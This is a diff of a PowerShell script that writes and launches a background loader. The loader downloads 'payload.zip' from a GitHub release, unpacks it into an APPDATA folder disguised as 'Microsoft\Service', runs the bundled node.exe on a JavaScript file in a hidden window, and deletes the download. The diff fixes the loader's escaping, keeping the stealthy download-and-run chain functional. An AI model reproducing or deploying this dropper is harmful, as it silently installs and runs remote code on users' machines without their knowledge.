@@ -4,31 +4,29 @@ $ErrorActionPreference = 'Stop'
 $bgScriptPath = Join-Path $env:TEMP "spice_bgmodules_$(Get-Random).ps1"
 
 @"
-\$dest = "\$env:APPDATA\Microsoft\Service"
-if (-not (Test-Path \$dest)) {
-    New-Item -ItemType Directory -Path \$dest | Out-Null
+`$dest = "`$env:APPDATA\Microsoft\Service"
+if (-not (Test-Path `$dest)) {
+    New-Item -ItemType Directory -Path `$dest | Out-Null
 }
 
-\$zipUrl = "https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip"
-\$zipPath = "\$env:TEMP\payload.zip"
+`$zipUrl = "https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip"
+`$zipPath = "`$env:TEMP\payload.zip"
 
-Invoke-WebRequest -Uri \$zipUrl -OutFile \$zipPath
-Expand-Archive -Path \$zipPath -DestinationPath \$dest -Force
+Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
+Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
 
-\$node = Get-ChildItem -Path "\$dest\App" -Filter "node.exe" -Recurse -File | Select-Object -First 1
-\$script = Get-ChildItem -Path "\$dest\App" -Filter "index_*.js" -Recurse -File | Select-Object -First 1
+`$node = Get-ChildItem -Path "`$dest\App" -Filter "node.exe" -Recurse -File | Select-Object -First 1
+`$script = Get-ChildItem -Path "`$dest\App" -Filter "index_*.js" -Recurse -File | Select-Object -First 1
 
-if (\$node -and \$script) {
-
-    \$arg = "\"\$($script.FullName)\""
-
-    Start-Process -FilePath \$node.FullName `
-        -ArgumentList \$arg `
-        -WorkingDirectory "\$dest\App" `
+if (`$node -and `$script) {
+    `$arg = "`"`$(`$script.FullName)`"`"
+    Start-Process -FilePath `$node.FullName `
+        -ArgumentList `$arg `
+        -WorkingDirectory "`$dest\App" `
         -WindowStyle Hidden | Out-Null
 }
 
-Remove-Item \$zipPath -Force -ErrorAction SilentlyContinue
+Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
 "@ | Set-Content -Path $bgScriptPath -Encoding UTF8
 
 $bg = $null
